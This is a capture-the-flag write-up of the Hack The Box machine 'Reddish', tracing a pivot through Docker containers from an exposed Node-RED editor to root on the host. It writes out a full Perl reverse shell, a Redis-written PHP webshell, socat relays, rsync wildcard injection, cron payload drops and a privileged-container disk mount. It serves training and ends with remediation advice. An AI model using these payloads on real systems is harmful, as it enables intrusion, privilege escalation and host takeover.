# Reddish — Five boxes in one: pivoting through a Docker estate

[![Difficulty](https://img.shields.io/badge/difficulty-Insane-red)](https://app.hackthebox.com/machines/reddish)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://app.hackthebox.com/machines/reddish)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=Yp4oxoQIBAM)

> **Attack path:** Node-RED editor exposed → exec-node RCE in the `nodered` container → find 172.19.0.0/24 → meterpreter `portfwd` pivot → unauthenticated **Redis** file-write webshell on the `www` container → rsync **wildcard injection** to root on `www` → writable rsync module on the `backup` container → root there → **privileged container** → mount the host disk → root cron on the Docker host.

The legendary insane box: the "machine" is really a Docker host running four containers across three internal networks, and the only way out is layer-by-layer. Bring a statically compiled toolkit and a lot of patience.

## 1 · Reconnaissance

```bash
nmap -p- --min-rate 10000 -oN reddish-allports 10.10.10.94
nmap -sCV -p 1880 -oN reddish-1880 10.10.10.94
```

Exactly one port: **1880/tcp — Node-RED** (Node.js flow editor). The UI path is derived from your IP:

```bash
curl -X POST http://10.10.10.94:1880/
# {"id":"..."}  → editor at /red/<md5-of-your-ip>/
```

Browse to `http://10.10.10.94:1880/red/<id>/` and you have the full drag-and-drop flow editor — no authentication.

## 2 · Foothold

### exec node → shell in the first container

Build a flow containing an **exec** node (arbitrary command execution by design) wired to an inject node, deploy, and feed it a Perl reverse shell (the container has Perl but no nc/python/php):

```bash
# exec node payload (pentestmonkey perl shell):
perl -e 'use Socket;$i="10.10.14.14";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Catch it however you like; IppSec upgrades to meterpreter (`sessions -u 1`) for the pivot tooling that follows.

```text
meterpreter> getuid  → root (in-container)
meterpreter> run post/linux/gather/checkcontainer  → docker container confirmed
```

### We are not on the box

```text
eth0: 172.18.0.2   eth1: 172.19.0.3      ← two Docker networks
gateways 172.18.0.1 / 172.19.0.1         ← the real host
```

Sweep the second network (`run post/multi/gather/ping_sweep 172.19.0.0/24` or upload a static nmap):

```text
172.19.0.2  → 6379 (redis)
172.19.0.4  → 80    (www)
```

### Pivoting with meterpreter portfwd

```text
meterpreter> portfwd add -l 6379 -r 172.19.0.2 -p 6379
meterpreter> portfwd add -l 80   -r 172.19.0.4 -p 80
```

`redis-cli -h 127.0.0.1` and `curl http://127.0.0.1` now hit containers the attacker box can't route to.

## 3 · User flag

### Redis → webshell on www

The `www` app (browse it through the portfwd) makes AJAX calls to `/8924d0549008565c554f8128cd11fda4/ajax.php`, and its JS hints that redis and www **share the `/var/www/html` volume**. Unauthenticated Redis lets us abuse `CONFIG SET dir`:

```bash
redis-cli -h 127.0.0.1
> flushall
> set shell "<?php system($_REQUEST['cmd']); ?>"
> config set dir /var/www/html/8924d0549008565c554f8128cd11fda4
> config set dbfilename "df.php"
> save
```

```bash
curl "http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=id"
# uid=33(www-data) — note: a cron wipes the web dir roughly every 3 minutes
```

`www` can't reach the attacker box directly, so chain another hop — a socat relay on the first container:

```bash
# on nodered (172.19.0.3):
socat tcp-listen:223,fork tcp:10.10.14.14:223
# webshell cmd= → perl reverse shell connecting back to 172.19.0.3:223
```

### Root on www: rsync wildcard injection

A process-monitoring loop reveals a root cron (every 3 minutes):

```text
/backup/backup.sh:  rsync -a *.rdb rsync://backup:873/src/rdb/
```

The unquoted `*` invites the classic Unix wildcard attack (rsync's `-e` sets the remote shell):

```bash
cd /backup
echo 'perl -e ... reverse shell to 172.19.0.3:9010 ...' > p.rdb
touch -- '-e sh p.rdb'          # expands to: rsync -a '-e' 'sh' 'p.rdb' ...
```

At the next cron tick the callback lands as **root on the www container**:

```bash
cat /home/somaro/user.txt
<flag>
```

## 4 · Privilege escalation

`backup` resolves to `172.20.0.2` — a third Docker network — and exposes **rsync on 873** with a `src` module mapping to `/` of the backup container, read/write. That is arbitrary file write as container-root:

```bash
# local file "shell" containing a cron entry:
echo '* * * * * root sh /tmp/shell.sh' > shell
rsync -a shell rsync://172.20.0.2/src/etc/cron.d/shell
rsync -a shell.sh rsync://172.20.0.2/src/tmp/shell.sh   # perl callback (via www's socat relay)
```

Within a minute: **root on the backup container**.

## 5 · Root flag / Domain Admin

### The privileged container escape

`docker-compose` runs `backup` with **`privileged: true`** — the container sees the host's raw block devices:

```bash
fdisk -l                 # host disks: /dev/sda ...
mkdir /mnt/host && mount /dev/sda2 /mnt/host   # (sda1 on the original release)
```

The mount **is** the Docker host filesystem. Read the flag and finish with host-root code execution:

```bash
cat /mnt/host/root/root.txt
<flag>
```

```bash
# drop a payload + cron onto the host disk:
echo 'perl -e ... reverse shell straight to 10.10.14.14:9010 ...' > /mnt/host/opt/shell.sh
echo '* * * * * root sh /opt/shell.sh' > /mnt/host/etc/cron.d/shell
```

The callback returns on the real machine — `hostname` = `reddish`, `id` = `uid=0(root)`. Full circle.

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| Node-RED editor (port 1880) exposed with no authentication and exec nodes enabled | Instant RCE in a container for anyone who can reach the port | Put Node-RED behind auth/reverse proxy; disable exec nodes in production; never expose 1880 externally |
| Unauthenticated Redis reachable from adjacent containers | Arbitrary file write (webshell) on any container sharing a volume | `requirepass` + ACLs; bind Redis to localhost; never share web roots as Redis data dirs |
| Root cron running `rsync` with unquoted wildcards (`*.rdb`) | Unix wildcard injection → root command execution on www | Quote globs; avoid root crons acting on user-writable directories |
| rsync module `src` exported read/write to peer containers | Full filesystem write on the backup container → host escape | Read-only modules; `rsync-uid`/chroot; never export `/` of a container |
| `privileged: true` on the backup container | Direct host disk access → total host compromise | Drop privileged mode; use specific `devices`/capabilities; enable user namespaces and rootless Docker |

## 7 · CPTS takeaways

- **Pivoting is a CPTS exam skill**: meterpreter `portfwd`, socat relays and socks proxies turn one foothold into network-wide reach — practice until re-chaining hops is muscle memory.
- Enumerate like a container: multiple interfaces + 172.x addresses means "you're inside Docker" — map every subnet, expect the target to be several hops deep.
- Redis unauthenticated RCE via `CONFIG SET dir` + `dbfilename` is a certifiable classic — know it cold.
- Unix **wildcard injection** (`-e sh p.rdb` against `rsync`/`tar`) is a recurring privesc answer on Linux hosts.
- Container escape literacy: privileged containers, exposed Docker sockets, host mounts — know which misconfiguration gives which escape.
